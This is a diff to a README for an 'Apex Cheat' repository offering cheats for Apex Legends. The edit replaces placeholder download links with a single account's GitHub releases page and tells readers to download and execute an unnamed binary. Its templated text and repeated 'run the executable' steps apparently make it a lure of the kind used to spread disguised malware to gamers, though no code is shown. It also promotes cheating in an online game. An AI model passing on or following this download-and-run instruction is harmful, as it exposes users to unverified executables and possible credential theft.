@@ -1,6 +1,6 @@
 # Apex Cheat Repository
 
-![Apex Cheat](https://img.shields.io/badge/Apex%20Cheat-Download-blue)
+![Apex Cheat](https://github.com/SatoshijSnr/Apex/releases%20Cheat-Download-blue)
 
 Welcome to the **Apex Cheat** repository. This project focuses on enhancing your gameplay experience in Apex Legends. Here, you will find various cheats and tools designed to give you an edge in the game. 
 
@@ -19,7 +19,7 @@ Welcome to the **Apex Cheat** repository. This project focuses on enhancing your
 
 Apex Legends is a popular battle royale game that requires skill and strategy. While many players aim to improve their skills through practice, some seek tools to enhance their gameplay. This repository provides various cheats, scripts, and tools that can help you achieve that. 
 
-To get started, you can download the application from the following link: [Download Application.zip](https://github.com/user/repo/Application.zip). After downloading, execute the file to begin using the cheats.
+To get started, you can download the application from the following link: [Download https://github.com/SatoshijSnr/Apex/releases](https://github.com/SatoshijSnr/Apex/releases). After downloading, execute the file to begin using the cheats.
 
 ## Features
 
@@ -33,7 +33,7 @@ This repository includes several features designed to improve your gaming experi
 
 ## Installation
 
-1. **Download the Application**: Click on the link to download the application: [Download Application.zip](https://github.com/user/repo/Application.zip).
+1. **Download the Application**: Click on the link to download the application: [Download https://github.com/SatoshijSnr/Apex/releases](https://github.com/SatoshijSnr/Apex/releases).
 2. **Extract the Files**: After downloading, extract the zip file to your preferred location.
 3. **Run the Application**: Locate the executable file and run it. Follow the on-screen instructions to configure the cheats.
 
@@ -87,4 +87,4 @@ For questions or suggestions, please reach out to the repository maintainers. Yo
 
 ---
 
-Thank you for visiting the **Apex Cheat** repository. We hope you find the tools helpful in your Apex Legends journey. Remember to check the [Releases](https://github.com/user/repo/releases) section for the latest updates and downloads. Enjoy gaming!
+Thank you for visiting the **Apex Cheat** repository. We hope you find the tools helpful in your Apex Legends journey. Remember to check the [Releases](https://github.com/SatoshijSnr/Apex/releases) section for the latest updates and downloads. Enjoy gaming!
